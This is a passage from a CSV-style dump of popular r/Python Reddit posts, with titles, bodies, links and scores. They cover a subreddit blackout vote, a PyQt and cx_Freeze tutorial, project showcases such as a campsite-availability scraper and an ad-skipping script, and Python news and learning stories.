* Signing up is the first step. Actually finishing the course is the next. :) [There are several ways to get/stay motivated.](https://www.reddit.com/r/learnprogramming/wiki/faq#wiki_how_can_i_get.2Fstay_motivated_to_learn_programming.3F) I suggest getting a ""gym buddy"" to learn with.",https://www.reddit.com/r/Python/comments/hjgvcz/automate_the_boring_stuff_with_python_online/,65,886
e0duk5,Just found an awesome new plugin for pyinstaller. pip install auto-py-to-exe,,https://i.redd.it/96esb55pkd041.png,45,890
5sel2v,Python for Algorithmic Trading and Investing tutorial series,"Hi there, my name is Harrison and I frequently do Python programming tutorials on [PythonProgramming.net](https://pythonprogramming.net) and [YouTube.com/sentdex](https://www.youtube.com/user/sentdex).  All tutorials are free in both text and video forms.

The latest series that I have put out is [Python for Finance](https://pythonprogramming.net/getting-stock-prices-python-programming-for-finance/). The aim of this series is to show what can be done with Python in the field of finance and algorithmic trading using data science (spoiler alert: a lot!). 

Even though you probably aren’t going to get rich, you might save yourself a lot of money (when you back test your silly trading idea and realize it’s bad), and you’ll learn about statistics and data science with Python along the way. 

I start the series off with a simplistic introduction to using Python+[Pandas](https://pythonprogramming.net/data-analysis-python-pandas-tutorial-introduction/)+[Matplotlib](https://pythonprogramming.net/matplotlib-intro-tutorial/)  to get stock data, visualize stock data, and to manipulate this data. 

From here, we get into Quantopian, which is a Python-based platform built on top of the Zipline library for back-testing, but has since expanded out to enable quite a bit more than that.

We use Quantopian both for simplistic back testing, but also for doing research into future trading strategies, since Quantopian also provides a bunch of free data like minute pricing data, fundamentals along with tools like [Alphalens](https://github.com/quantopian/alphalens) for analyzing various factors that you believe to be beneficial to a trading strategy.

If you would like to check it out, the series starts here: 
[Python for Finance introduction](https://pythonprogramming.net/getting-stock-prices-python-programming-for-finance/)

If you are already familiar with Pandas and want to jump straight into the strategies and using Quantopian for back-testing and research:
[Algorithmic trading and research with Quantopian](https://pythonprogramming.net/quantopian-trading-strategies-introduction-python-programming-for-finance/)

If you have any questions, requests, or suggestions, feel free to ask here or on the respective tutorials.",https://www.reddit.com/r/Python/comments/5sel2v/python_for_algorithmic_trading_and_investing/,54,890
14lfawc,"By community vote, r/Python will Return to a Blackout","until a major response from Reddit. 

Like [we did on June 12th](https://old.reddit.com/r/Python/comments/146zye6/rpython_will_black_out_on_june_12_at_0000_utc/), our community will be set to private. This time until a major response from Reddit takes place. 

### Is this something our community wants to do?
As with the first blackout, Yes.

Throughout this whole process, we have been choosing our course of action based off of our community. [The first request for feedback](https://old.reddit.com/r/Python/comments/1434dxo/should_rpython_participate_in_the_june_12th/) supported the blackout protest on the 12th, and after we opened back up [we sought more feedback for going forward](https://old.reddit.com/r/Python/comments/14ai1m5/an_update_about_our_community/), and once again received majority support for the blackout. 

* Comments with the keyprhase, ""Black"":  37 (unfiltered** total: 285)
* comments with the keyphrase, ""restrict"": 7 (unfiltered** total: 26)
* comments with the keyphrase, ""open"": 15* (unfiltered** total: 62)

\* The raw count is 12, however when reviewing all messages which don't fit into the quick classifier there are around 3 comments which imply 'reopening'. 

** unfilter is all top level comments which had a use of one the key phrases in the first line of the comment

The voting function used to count the votes is shown below

    def measure_vote(comment):

        phrases = [""black"", ""restrict"", ""open""]
        first_line = comment.body.split('\n')[0]
        match = -1
        for i in range(len(phrases)):
            if phrases[i] in first_line.lower():
                match = i
        return match



This code is super lazy, and was written to see if the vote was close enough to need a more fine tuned approach, but with calls to return to a blackout being nearly double the combined two alternatives (when restricting the usergroup to those who participated in the /r/Python subreddit the month prior to the original call for blackout) the vote was very clear. 

If someone wrote all three options on their first line, the vote would be counted towards reopening. In the event that the reopen vote was close, this was to be revisited. 

Votes were tallied on June 22nd at 00:00 UTC (give or take. This submission, and all posts and their comments from the month prior were grabbed earlier using the API and PRAW, and took until a bit after the start of the 22nd UTC to finish getting the data.




# What's next

At some point, we're going to be forced to reopen. That's probably a good thing. But for the time being we'll set the community to private in protest of the current direction of Reddit. 

During that protest, I'll be on vacation. I was already going to be on vacation, but now I get to completely unplug for a bit. 

If I'm still a moderator when I get back, I'll make a post calling for new moderators. There's a number of folks who have worked to make this community special who I hope apply, and a number of folks who I hadn't thought of that'll apply who I'll be excited to discover. If this sounds like something interesting to you I hope you consider applying. I particularly hope to see candidates who've been informative to folks who have questions and supportive to folks showing what they've built. If we're lucky enough to see folks who are knowledgeable in the language and ecosystem as well, that'd be delightful. After that is organized I'm going to step down. 

On the horizon there'll hopefully be an AMA soon, and hopefully lots more AMAs there after. Those are hard to predict and plan, but they were some of my favorite parts of this experience. I love hearing neat folks talk about things they're passionate about. Additionally I'd like to see more engagement between the Python subreddit and conferences, but that's way way in the future. 

# Where to Migrate
I do not know.

There's a number of instances on Lemmy, and I don't know which one to direct this community to. Try them. See if you like them. Keep sharing cool stuff, and asking good questions. If the instance seems to adhere to the PSF Code of Conduct, I'd say keep engaging with it. This sub grew to be special because of everyone who contributed, and if you contribute to another instance then it'll grow to be special as well.

I'm going to be on the Python Discord, and if there's a Lemmy instance they start, or they find  one they feel is worth partnering with I'm sure they'll have an announcement or list it among their resources. 

I'm sure the Python community will be self organizing around bastions of openness and general enthusiasm to nerd out.",https://www.reddit.com/r/Python/comments/14lfawc/by_community_vote_rpython_will_return_to_a/,251,883
mnodtq,I turned a Nerf gun into a Call of Duty Warzone controller with Python,"&#x200B;

https://reddit.com/link/mnodtq/video/bd4w79w8t7s61/player

I used a Raspberry Pi, an old Android phone, 3D printing, a Nerf gun, and python to play COD Warzone with a Nerf gun lol. The project is open source:

Code: [https://github.com/AlfredoSequeida/Nerf-Gun-Call-of-Duty-Warzone-Controller](https://github.com/AlfredoSequeida/Nerf-Gun-Call-of-Duty-Warzone-Controller)

Video: [https://youtu.be/ld0Pcy6F-3g](https://youtu.be/ld0Pcy6F-3g)

Let me know if you have any questions!",https://www.reddit.com/r/Python/comments/mnodtq/i_turned_a_nerf_gun_into_a_call_of_duty_warzone/,58,888
bot638,Things you're probably not using in Python 3 — but should,,https://datawhatnow.com/things-you-are-probably-not-using-in-python-3-but-should/,177,888
9wxywk,Wrote some Python for Processing to generate bugs. Source code in comments,,https://i.redd.it/kazefqjx19y11.png,57,886
erx4ae,I made a galactic collision simulation in real time with Vpython,,https://v.redd.it/hceawytct5c41,31,883
ekurlp,Python 2 will retire from its 20 years of service in April 2020.,,https://www.python.org/psf/press-release/pr20191220/,100,880
nqvrml,Today i finished my first useful program,"I have been a mechatronics engineering intern in a cutting tools manufacturing company for 3 months and today i finished my first useful program. It made me so happy and saved my 4 coworkers from 2 weeks of soul destroying work. They were extremely thankful one of them bought ice cream to all of us.

Code wasn't perfect still got the job done. It was not as automated(pathing issues) as people would like it to be because i suck at file management and because it had to scan more than 10000 txt(.td actually but it is the same thing in this case) files for data  and append it to an excel file it didn't work at first but when we did 500 files at a time it worked slowly, it took 1 minute, but it worked. It gave me courage in the path i took and hope this post gives courage to people who are new to coding. I also want to thank to the people who are writing libraries, helping others with their code and people who are creating tutorials you guys are the real mvp!",https://www.reddit.com/r/Python/comments/nqvrml/today_i_finished_my_first_useful_program/,85,883
9ts367,"I just got a 67k job before I even graduated, all thanks to python.","I'm so happy and excited. I am a math major, turning 21 in December and have been learning python for about a year.

I applied for a position in data analysis with a mid sized company and got given a test / project to do.

I completed it and they told me I don't need to come for the second interview, I am the candidate they want. I signed the final paperwork a few days ago. 

I'm so grateful to the python community and to other subs dedicated to helping people learn how to code. I think I would have had a hard time finding employment otherwise. 

So thank you guys for being so amazing and helping me learn so much.

Edit:

So people have asked how I learned. I answered in the comments but codecademy then automate the boring stuff. Lastly reading and trying things from documentation.

I live on the east coast of Australia (not Sydney). It's pricey here but not insane. ",https://www.reddit.com/r/Python/comments/9ts367/i_just_got_a_67k_job_before_i_even_graduated_all/,175,878
7oz812,[off?] My wife made me a python banner,,https://i.redd.it/evlbb8164v801.jpg,56,877
l3sdim,pip drops support for Python 2,,https://pip.pypa.io/en/stable/news/#id1,110,883
kl3cyk,30 years(!) of Python Development Visualized. Amazing!,,https://www.visualsource.net/repo/github.com/python/cpython,34,885
nxlji5,New Features in Python 3.10,,https://youtube.com/watch?v=5-A435hIYio&feature=share,102,878
anpkle,How to Make a Desktop GUI Application in Python?,"Nowadays Python is one of the most popular programming languages. Specialists value its universality for all types of the tasks. Today, one of the most important qualities is convenience of command execution, but often developers have to write a relatively simple program, the quality criterion of which is an intuitive graphical interface. You have several ways to do this by means of Python. The following development tools are among the most popular:

* [PyQt](https://pypi.org/project/PyQt5/). The widespread Qt library, which implementations are available in various languages. It’s written in C++ and is cross-platform. This library allows the development of applications that have familiar and ordinary appearance in the general sense of this word.
* [Tkinter](https://docs.python.org/3/library/tkinter.html)**.** This tool is often referred to as standard for developing GUI applications in Python, appeared back in the early 90s of the twentieth century. Due to the long history and ease of use, Tkinter has a rather extensive and active community. It’s thanks to it you can find a large number of semi-finished products or publications in the network and get an answer to any question at specialized forums.
* [WxPython](https://wxpython.org)**.** Another descendant of C++, namely WxPython, links the wxWidgets cross-platform library with Python. In some ways, Tkinter and WxPython are quite similar, but WxPython is slightly younger and is more advanced approach to creating GUI applications in Python. Also, the entry barriers for the start are quite low due to the rapidly developing and friendly community. Perhaps the installation and the first steps will require a little more effort than the tools described above, but believe me, the result is worth it!

At a certain stage I chose PyQt for my work and in this article would like to show you an example of creating the simplest application for a content manager; so you’ll get to know the GUI for Python, libraries for natural language processing, and several ways of creating \*.exe file from \*.py for Python 3.6 script.

# Step 1. Python GUI: Creating simple application with PyQt and Qt Designer

First you need to understand what software is wanted. The content manager of [Casino Now](https://casino-now.co.uk) project gives priority to such parameters of content as

* Word count
* Number of characters
* Percentage of stop words
* Keyword density
* Presence of keywords in headers
* List of popular n-grams
* Text’s uniqueness

If for some reason you haven’t yet installed the PyQt library, the simplest method is to enter this code in the command line

    pip3 install PyQt5

All support tools will be installed automatically. When the installation is completed, open Qt Designer and create the necessary form using standard elements.

&#x200B;

[Figure 1 – General view of the dialog box](https://preview.redd.it/ch0j426wgxe21.jpg?width=1138&format=pjpg&auto=webp&s=fd0047e99d031a95d1632d9e7476c7836dd69e04)

The following is the layout of future application. Don’t judge too harshly, this is just an introductory demo to show several possibilities ;)

&#x200B;

[Figure 2 – Dialog box](https://preview.redd.it/i1e9saywgxe21.png?width=594&format=png&auto=webp&s=9236d074fa9b40151e6343d5dce1174468984e86)

Bear in mind the specialized tools to keep the graphical interface user-friendly regardless of workspace’ scaling.

&#x200B;

[Figure 3 – Example of saving workspace proportions when scaling](https://preview.redd.it/jeez8qxxgxe21.jpg?width=1136&format=pjpg&auto=webp&s=c1d0b6f128132a2185c83ad78e89d988b448f3f6)

In order to turn the interface into a program code for use, you have to save the resulting layout. Thus, the file with MainForm.ui extension is received. To get access in the framework from the project, you need to convert the MainForm.ui file to the \*.py extension. To do this, go through the command line to the folder containing the file with \*.ui and run the following command

    pyuic5 -x MainForm.ui -o MainForm.py

&#x200B;

[Figure 4 – File conversion](https://preview.redd.it/az5emddzgxe21.jpg?width=411&format=pjpg&auto=webp&s=256f04d8bd8b32b7f697e9f9cf61260eeec995bf)

Thus, you get the file of required extension and can run a prototype of the application.

&#x200B;

[Figure 5 – Plug-ins of the developed application](https://preview.redd.it/35qvip40hxe21.jpg?width=922&format=pjpg&auto=webp&s=cdcd1fa72dc01dd2bc79dc2af6d298a9859c341a)

The full source code has the structure presented at Figure 6. You can find the expanded version on my Github [https://github.com/TinaWard](https://github.com/TinaWard). In this article, I’d like to explain the application’s build in more detail.

&#x200B;

[Figure 6 – Application code](https://preview.redd.it/qqkq0331hxe21.jpg?width=889&format=pjpg&auto=webp&s=ee7b345c93410ffe5fb7fec4a6145874427e788b)

# Step 2. How to convert python script in exe

The most popular tools for building an application today are [PyInstaller](https://www.pyinstaller.org) or [cx\_Freeze](https://anthony-tuininga.github.io/cx_Freeze/). For this article let’s focus on such building method as cx\_Freeze. As a matter of fact, it’s analogous to PyInstaller with the only difference that in case of PyInstaller you don’t need to write your own installer script (setup.py), but at the same time, the similar manipulations must be performed via the command line or in the \* .spec file. The tool cx\_Freeze is set in the standard way:

    pip install cx_freeze
    pip install –user cx_freeze

The first step in creating a full-fledged application is the proper formation of the setup.by file.

The following is the frame of this file. The steps of the **setup.by** file are intuitive, but let’s look in more detail. First of all, import two entities: the setup function and Executable class. The most informative is the **options** dictionary (dictionary of dictionaries as it's usually called), which is used to improve the build. It may have such parameters:

* **excludes** – list with description of modules not to be included in the assembly. You shouldn’t overuse this parameter, since you can overdo and delete what you really need: nested dependencies.
* **includes** – parameter opposite to excludes, that’s the list of signal modules that must be included in the assembly. Also cx\_freeze may not find some packages or modules, in particular if they were imported into similar package using the import function. If you have a GUI application, you have to specify the name of the script with the \*.py extension, in our case it’s **MainForm**.py.
* **packages** – compulsory packages to be included.
* **zip\_include\_packages** – list of packages to be archived
* **include\_files** – list of lines or files tuples that need to be added to the assembly, but these are not Python files.

Now let's take a closer look at the Executable class:

* **targetName** allows you to specify the name of the \*.exe file, by default it matches the name of the launching script.
* **base** = **‘Win32GUI’** If you set a parameter as described in the example, it means that the graphical application is processing and the console window will not appear.
* **icon** – parameter to set the icon of the application launcher, by default uses pictures with \*.ico ext.

&#x200B;

    # -*- coding: utf-8 -*-
    
    from cx_Freeze import setup, Executable
    import os
    options = {
    'build.exe': { 'icludes': ['MainForm'], 'packages': ['pandas'], 'excludes ': excludes } }
    os.environ['TCL_LIBRARY'] = r'C:\Users\User3\Anaconda3\tcl\tcl8.6'
    os.environ['TK_LIBRARY'] = r'C:\Users\User3\Anaconda3\tcl\tk8.6'
    setup(
    name = ""TextTool"", version = ""0.0"", description = ""Here write smth"", options = options, executables = [Executable('TextToolS.py', targetName = ‘ThisIsName.exe’)])

To compile you need to run the setup.py file. To do this, enter the following code via the command line from the project directory:

    python setup.py build

After that you will see the launch of the project build.

&#x200B;

[Figure 7 – Running project build](https://preview.redd.it/jgtrlj6khxe21.jpg?width=655&format=pjpg&auto=webp&s=480540ce993a8208c81fce78d18c3413149f8f9b)

Building a project can take from 10 seconds to several minutes, depending on the size and number of interconnected modules in your application.

Not always the project build runs smoothly, let’s look at some of the most common mistakes. Most of them can be solved by searching and writing in the correct parameters of the setup function in the setup.py file, but often due to laziness or lack of time, the temporary ways are implemented to solve this problem. For example, this one, when you haven’t specified the module’s addition:

&#x200B;

[Figure 8 – Error example](https://preview.redd.it/dx9fl0glhxe21.jpg?width=873&format=pjpg&auto=webp&s=3955eff4159f0fdff1a670fe7d664e05f11a5cce)

    ""Missing required dependencies {0}"".format(missing_dependencies))
    ImportError: Missing required dependencies ['numpy']

To make this just copy \_methods.py file from Anaconda library

…\\Anaconda3\\Lib\\site-packages\\numpy\\core

to numpy folder ‘core’, located

…\\build\\exe.win-amd64-3.6\\lib\\numpy\\core.

&#x200B;

[Figure 9 – First type error fix](https://preview.redd.it/jd0b7ufnhxe21.jpg?width=794&format=pjpg&auto=webp&s=3f7e9f296b4f18d85b7466810e16af8af6527de6)

The second common mistake is undersampling hidden dependencies. It’s possible that you didn’t see the hidden dependencies of the packages and didn’t add it. Often the problem occurs with packages like idnadata

&#x200B;

[Figure 10 – Second type error](https://preview.redd.it/46jgu19ohxe21.jpg?width=800&format=pjpg&auto=webp&s=e60341d7b67b77cad604b95cbcfb313ddc1edd69)

    File ""C:\Users\User3\Anaconda3\lib\site-packages\tldextract\__init__.py"", line 3, in <module>
    from .cli import __version__
    File ""C:\Users\User3\Anaconda3\lib\site-packages\tldextract\cli.py"", line 14, in <module>
    from .tldextract import TLDExtract
    File ""C:\Users\User3\Anaconda3\lib\site-packages\tldextract\tldextract.py"", line 62, in <module>
    import idna
    File ""C:\Users\User3\Anaconda3\lib\site-packages\idna\__init__.py"", line 2, in <module>
    from .core import *
    File ""C:\Users\User3\Anaconda3\lib\site-packages\idna\core.py"", line 1, in <module>
    from . import idnadata
    ImportError: cannot import name 'idnadata'

The algorithm is the same, you find the missing file in the folders of the installed libraries and copy it in the appropriate folder of your assembly. This’s win-win option if you need a quick compilation for testing.

From …\\Anaconda3\\Lib\\site-packages\\idna to …\\build\\exe.win-amd64-3.6\\lib\\idna

&#x200B;

[Figure 11 –Second type error fix](https://preview.redd.it/exn2z8tphxe21.jpg?width=692&format=pjpg&auto=webp&s=2963ac8ae8552f8295d824068ad19c9d7578c062)

In general, the advantages of cx\_Freeze are:

* Startup files for Linux
* MSI installers for Windows
* RPM packages for Linux
* Software packages for Mac OS X (.app, .dmg)

The disadvantages are:

* No possibility to pack all python-modules and dll-files in one exe-file
* No cross compilation

# Conclusion

In this article we have looked at the principles of creating a GUI application in Python using PyQt and compiling the created app to \*.exe by means of cx\_Freeze. I hope you enjoyed this article, if you have any questions, please contact [tina.ward@mail.uk](mailto:tina.ward@mail.uk).",https://www.reddit.com/r/Python/comments/anpkle/how_to_make_a_desktop_gui_application_in_python/,134,874
is6et5,Happy 1600000000 seconds since epochs everyone!,"I just converted a timestamp and was surprised to see 1600029670

As of Sunday, September 13, 2020 12:26:40 PM UTC, we moved up.

The last change was July 14, 2017, when we stepped into the 1500000000's

In case you don't believe me, check it yourself 😂

    import time
    time.time()",https://www.reddit.com/r/Python/comments/is6et5/happy_1600000000_seconds_since_epochs_everyone/,35,878
jkw8tr,Deepnote – a Python notebook with real-time collaboration in the browser. We just opened the platform to the public.,,https://deepnote.com/,49,872
fqnmbt,"*for fun* (3months coding experience, just learning the ropes) I made a simple tkinter GUI that keeps track of your current weed, total grams bought, and total spent, and how much you bought and smoked each day. it exports the data to be viewed in an excel file.",,https://v.redd.it/5vs4nsmtyfp41,93,877
8wc2vi,"5 rarely mentioned but super useful packages you should know about. Also, one of mine","I feel like there are a lot of packages out there that are incredibly useful, but often get overlooked for one reason or another. It seems like people spend a lot of time re-implementing something that's already been done pretty well, and that's too bad. Because, using a nice package with a slick api is like taking a breath of crisp morning mountain air.

So here's some packages I love that I think folks should know about and take a look for themselves:

[Inflection](http://inflection.readthedocs.io/en/latest/): Inflection is ridiculously useful. It has all kinds of tools for altering strings into different formats. Think, conversion from CamelCase to snake\_case. Or, even ordinalizing numbers (1 -> 'first'). Pluralization is in there too. It's really handy with lots of features. I've used it for a few years now without any problems and a whole lot of fresh air in my life.

[Pendulum](https://pendulum.eustace.io/): Python's datetime library is....well, painful to use. It has most everything you need, but doing what you want might be a whole afternoon of consternation. I used a few date/time libraries before I stumbled onto Pendulum. This library is really great. Not only does it offer a great parser that you rarely have to provide anything more than a string representation of a datetime, but it has lots of really useful utilities for working with dates and times (and both). Finally, the best part is that it's a \_drop-in\_ replacement! In fact, Pendulum DateTime objects inherit from python's native DateTime, so you can almost always use them anywhere you would use normal DateTime. This one has been a favorite for a long time.

[pprintpp](https://github.com/wolever/pprintpp): Python's native pretty-printer often renders stuff that's...well, not pretty at all. I often deal with a lot of deeply nested native data-structures (basically JSON rendered into python), and when I'm debugging python's pretty-printer feels pretty stuffy. Enter pprintpp. It's a drop-in replacement that can monkey-patch the built-in pprint function. At any rate, my deeply-nested dicts are formatted with a whole lot more readability in my logs with this package

[Snakeviz](https://jiffyclub.github.io/snakeviz/): Profiling performance becomes a pretty necessary task in most python projects with any degree of longevity. However, exploring profile dumps can be a super stuffy experience a lot of times. I've suffered through enough non-intuitive files and interfaces trying to dig down to the cause of slowness in my lifetime. Then, I found Snakeviz. It provides a really intuitive, interactive, in-browser way to explore profiling information. This tool has actually made profiling fun and exciting, and I can't recommend it enough.

[Livereload](https://github.com/lepture/python-livereload): Suppose you're doing something like, say, working on your project's documentation. It's really not fun to, after each tweak of your config or doc files, have to manually run the sphinx-build commands and then open the produced html in a browser. Instead, you might try Livereload. You provide a list of files to watch, run it, and open a browser. Then, any time you change the file, your page will automatically reload. It's a core element of one of my personal projects (sphinx-view...and this doesn't count as my plug), and without it things would be a lot more painful. It can also be used for any number of other situations where html is produced from source files. It's pretty easy to use, too, and soo crisp and cool when you see it in action.

Finally...my plug:

[py-buzz](https://github.com/dusktreader/py-buzz): ""That's not flying, it's falling with style."" Honestly...I have way too much fun with the name. The whole point of this package is that I found myself re-writing the same pattern over and over with custom exceptions. Typically, when I'm writing a new library, I end up with a custom exception base-class that I use (along with derived exceptions) throughout the project. Then, I end up doing the same thing over and over. Well, I took that irritation and turned it into a tool. The handiest parts of this package is the \`Buzz.require\_condition\` function that acts like an assert that isn't disabled in production and \`Buzz.handle\_errors\` which gives you a context manager to handle exceptions within a block. I dog-food the hell out of this package, so it should be in great working order. There's other neat features, but I'll let you read up yourself, if you're interested.

If not, please enjoy learning about the other 5 packages above.

And, please remember, if you find yourself dealing with something annoying: Stop. Google the problem. Find a package that already does it. Install that. Breathe the fresh mountain air.",https://www.reddit.com/r/Python/comments/8wc2vi/5_rarely_mentioned_but_super_useful_packages_you/,50,871
desohg,Automate the Boring Stuff with Python (2nd edition) is coming soon!,"Attention Fans of Al Sweigart's books such as Invent Your Own Computer Games with Python and Cracking Codes with Python:

Al just announced that the second edition of Automate the Boring Stuff with Python is coming soon (and is available for preorder).

It's almost 600 pages long now (100 pages longer than the first edition), includes a ton of new content (Working with Google Sheets, EZGmail, SMS email gateways, and Mu editior), and more than a handful of new projects (I'm especially excited about Zombie Dice!).

I'm looking forward to it, and if you're interested in practical application of Python, you might want to check it out!

[https://inventwithpython.com/blog/2019/10/07/whats-new-in-the-2nd-edition-of-automate-the-boring-stuff-with-python/](https://inventwithpython.com/blog/2019/10/07/whats-new-in-the-2nd-edition-of-automate-the-boring-stuff-with-python/)",https://www.reddit.com/r/Python/comments/desohg/automate_the_boring_stuff_with_python_2nd_edition/,66,870
c67pxe,"First post here, thought you guys might like this. I've been working on an electrical thruster for small satellites for my Master Thesis, counting the ignitions with some Python scripts (+webcam) I wrote. (note the super high-tech hardware setup)",,https://i.redd.it/q2qnpy4bfx631.jpg,122,870
8s07vc,The Ultimate List of Python YouTube Channels,,https://realpython.com/python-youtube-channels/,41,874
mteoc0,I built a web scraper to notify you of cancellations at fully booked campsites in Yellowstone National Park,"**TLDR**: The [tool is hosted on GitHub](https://github.com/juftin/yellowstone-camping), scrapes the [Yellowstone Campsite Availability](https://secure.yellowstonenationalparklodges.com/booking/lodging) API, and sends push notifications to your mobile device when a campsite becomes available.


**UPDATE**: This project was expanded to search Yellowstone and all of [recreation.gov](https://recreation.gov) (thousands of campgrounds all over the USA). More info at [github.com/juftin/camply](https://github.com/juftin/camply).

My partner and I are taking a trip this summer (July, 2021) from home in Colorado through Wyoming to Glacier National Park. Like all national parks right now, the campsites in Glacier are a hot commodity and tough to come by.

To help us get an advantage in finding a site we signed up for [*Campnab*](https://campnab.com/), a service that lets you sign up for text notifications when booked out campgrounds receive cancellations. Long story short, it's totally worth it I have nothing but great things to say about it. We found a 5 day cancellation and booked our first choice campground within a couple weeks of signing up for text alerts.

On our way home from Glacier we'll be going through Yellowstone and Grand Teton National Park. Unfortunately, Campnab doesn't (currently) work for most sites in Yellowstone, since they use a different booking provider than the rest of the National Park System. Instead, I decided to play around with the booking website and build my own integration with their API. It runs in a docker container, and sends push notifications through [Pushover](https://pushover.net/).

Feature Requests and Technical Feedback / Questions are best done though the [Issues Page](https://github.com/juftin/yellowstone-camping/issues). Some basic command line skills and an always-on computer are required to run this.

We're still waiting for our Yellowstone spot as of writing this and can't wait to get back there this summer. I hope this tool is useful for someone out there, good luck hunting for your next spot!

[**Source Code/Documentation on Github**](https://github.com/juftin/yellowstone-camping)",https://www.reddit.com/r/Python/comments/mteoc0/i_built_a_web_scraper_to_notify_you_of/,44,867
ao5dml,Flask has overtaken Django according to the 2018 JetBrains Developer Survey,,https://www.jetbrains.com/research/python-developers-survey-2018/,227,867
9lwk7u,"""Python is becoming the world’s most popular coding language"" via The Economist!",,https://i.redd.it/728jemquxkq11.png,349,873
pa0a76,"Self taught coders with no degree who landed a good job by working hard, tell me your process.","Hello fellow coders. I’ve been on a slump learning and teaching myself how to code. I am at a point in my life where this is my only way out but I have been stuck on finding the motivation. How hard is it to land a job after teaching yourself how to code?

Edit: Holy crap I did not expect this post to blow up. So much great information and tips coming from the lot of y’all’s. In hindsight I should’ve also asked how long it took to get where you are.",https://www.reddit.com/r/Python/comments/pa0a76/self_taught_coders_with_no_degree_who_landed_a/,196,871
mzinii,Finally switch- case is coming to python.,"No more ""where is switch case in python?""

In the python 3.10 release according to the accepted PEP634,635,636 Match-Case statement will be added which is similar to Switch-Case statements in other languages. Match case is structural pattern matching which will match 'cases' against the subject value 'match'. 

[https://blog.electroica.com/switch-case-is-match-case-python/](https://blog.electroica.com/switch-case-is-match-case-python/)",https://www.reddit.com/r/Python/comments/mzinii/finally_switch_case_is_coming_to_python/,153,866
haje4i,"Since you guys loved my previous project, here is another one where i used same CNN to control RC car running on Arduino as server and python as client with Rock,Paper,Scissors gestures.",,https://v.redd.it/kaf1u6ds6e551,35,868
k8yv7b,I made a script to skip youtube ads!,"[https://github.com/reddtoric/SkipYTAds](https://github.com/reddtoric/SkipYTAds)

# SkipYTAds

Hate YouTube ads **but don't want to use an ad blocker**? **You don't mind those ads because some are good or introduces you to new things but you don't want those extra long annoying ones?** Well, here's a python script just for that!

This python script automatically searches for the skip button every 6 seconds (adjustable) and if there is a skippable ad, it'll skip it for you. And if you're in the middle of watching a skippable ad but interested in continuing, just press the pause button (before it does  it's thing) and it'll pause the script. Then returns your cursor back to where it was (but does not refocus your original window; a desired  feature possibly added).

[Readme](https://github.com/reddtoric/SkipYTAds) file in repo

---

**Edit:** Since some have questioned things that are stated in the Readme.

[Readme](https://github.com/reddtoric/SkipYTAds)'s Table of content

- Prerequisites  
  *To do. Python 3?
- Running the script
- Pausing/Unpausing the script
- Verbosity Modes
- Adjustable Interval
- Running multiple monitors? (like me)
- Compatibility
- Other settings
- Ad not skipping? Want script to match other images to click?
- Features to implement (if I feel like it)
- Libraries used
- Dev Note (See below)


And to answer and respond to those that say it's overkill or better solutions or whatever it may be:

### Dev note:

**This script may be clunky and not robust but it works to my specs. I wanted something that clicks the button for me when I'm doing stuff and have a video playing.**

It doesn't work while in a game that centers your cursor and not allowing it outside of the window which I'm okay with.

**I don't use ad blockers because I actually like to see some of the ads.** But other ads like an ad of a tutorial on a brand of smart lights that is several minutes long is extremely displeasing. I DON'T OWN ANY. Why is an ad showing me how to use smart lights!? Just assuming that it's popular or everyone owns them.",https://www.reddit.com/r/Python/comments/k8yv7b/i_made_a_script_to_skip_youtube_ads/,85,868
b3dbh6,A little python program I wrote that finds the current song playing on my Spotify account and then uses web scraping to display the lyrics.,,https://v.redd.it/gm102tkjkan21,74,868
4fuywi,"Ubuntu 16.04 LTS released with Python 3.5 as standard, rather than Pyhon 2.7!",,http://www.ubuntu.com/desktop/developers,141,867
xe2mzy,Machine Learning from Scratch with Python,"Hey everyone!

I've seen a growing number of people looking for resources on how to implement Machine Learning algos from scratch to better understand how they work (rather than just applying e.g. sklearn).

**This free** [**Machine Learning from Scratch Course**](https://www.youtube.com/watch?v=p1hGz0w_OCo) on YouTube takes you through writing 10 algorithms from scratch with nothing but Python and NumPy! The algorithms are:

1. K-Nearest Neighbors
2. Linear Regression
3. Logistic Regression
4. Decision Trees
5. Random Forest
6. Naive Bayes
7. PCA
8. Perceptron
9. SVM
10. K-Means

Hopefully some of my Python + ML friends will find this helpful! :)",https://www.reddit.com/r/Python/comments/xe2mzy/machine_learning_from_scratch_with_python/,42,862
pqs9au,The most WTF Python code I've ever seen,"[Link to source thread](https://www.reddit.com/r/learnprogramming/comments/kegalv/my_first_python_script_coming_from_c_feedback/)

https://preview.redd.it/uwl236w16bo71.png?width=304&format=png&auto=webp&s=7ca0f2d4ed7bfa68c74fcfe828f4671678c75e14

printf, braces? How does this even work. Seriously, it looks like someone wrote C in Python?",https://www.reddit.com/r/Python/comments/pqs9au/the_most_wtf_python_code_ive_ever_seen/,138,865
cq53v4,I made a program that will help you find deep learning AI projects and pre-trained models!,,https://v.redd.it/zi5oualykcg31,45,866
9f4fb6,A piece I did to commemorate the end of my python course. I was told you lot might enjoy!,,https://i.redd.it/9idgk79odql11.jpg,25,868
ti7uyh,I teach python for middle and high schoolers – I made this little trophy for a competition of who could make the best image using Turtle/Python,"I will also make some keychains with the best images 3d-printed on them – I hope the students like them!

&#x200B;

https://i.redd.it/7cyldg3odfo81.gif",https://www.reddit.com/r/Python/comments/ti7uyh/i_teach_python_for_middle_and_high_schoolers_i/,79,860
nao3cf,"I built a solar-powered crypto ""mining rig"" using a Raspberry Pi and Python","Full tutorial is [available on Hackster](https://www.hackster.io/rob-lauer/solar-powered-crypto-mining-with-raspberry-pi-64adee).

So this project was a blast, if not incredibly impractical.

[My Raspberry Pi 4 + PiJuice HAT + Notecarrier\/Notecard HAT](https://preview.redd.it/ldm619u9toy61.jpg?width=800&format=pjpg&auto=webp&s=dcd16db23b566fd3e8038ddbbc6d8b2f3aa55686)

tl;dr - don't expect a Raspberry Pi to generate you more than a few pennies (even on solar!).

I took existing OSS tools for CPU mining of Monero and wrote a Python script that would regularly scrape the log file generated...then report data from that log file to a cloud dashboard using cellular (making this nearly an off-grid solution as well).",https://www.reddit.com/r/Python/comments/nao3cf/i_built_a_solarpowered_crypto_mining_rig_using_a/,40,859
g3j55j,Managed to write a minimal Facebook video downloader in 32 lines of code (not including comments and blank spaces),,https://i.redd.it/kztler8yvit41.gif,96,855
8f61xl,Flask 1.0 released,,https://www.palletsprojects.com/blog/flask-1-0-released/,58,860
iwdzzx,Why have I not been using f-strings...,I have been using format() for a few years now and just realized how amazing f strings are.,https://www.reddit.com/r/Python/comments/iwdzzx/why_have_i_not_been_using_fstrings/,229,855
idxmnt,Snake game in a single line of python,"This is a fully functional game of snake in a single line of python using pygame. I did this mostly as a challenge to myself to see how compact I can make code, similar to code golf. I got it down to less than 3K characters, but I could easily get much less by shortening variable names.

